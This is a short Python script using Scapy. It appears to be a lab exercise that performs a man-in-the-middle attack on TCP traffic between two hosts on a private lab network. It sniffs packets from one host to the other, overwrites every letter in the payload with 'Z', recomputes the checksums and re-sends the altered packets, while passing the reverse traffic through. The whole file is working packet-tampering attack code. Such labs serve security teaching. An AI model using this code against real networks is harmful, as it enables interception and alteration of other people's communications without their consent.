#!/usr/bin/python3
from scapy.all import *
import re

VM_A_IP = '10.9.0.5'
VM_B_IP = '10.9.0.6'
VM_A_MAC = '02:42:0a:09:00:05'
VM_B_MAC = '02:42:0a:09:00:06'

def spoof_pkt(pkt):
	if IP in pkt and pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
		real = (pkt[TCP].payload.load)
		data = real.decode()
		stri = re.sub(r'[a-zA-Z]',r'Z',data)
		newpkt = pkt[IP]
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)
		newpkt = newpkt/stri
		print("Data transformed from: "+str(real)+" to: "+ stri)
		send(newpkt, verbose = False)
	elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
		newpkt = pkt[IP]
		send(newpkt, verbose = False)


pkt = sniff(filter='tcp',prn=spoof_pkt)
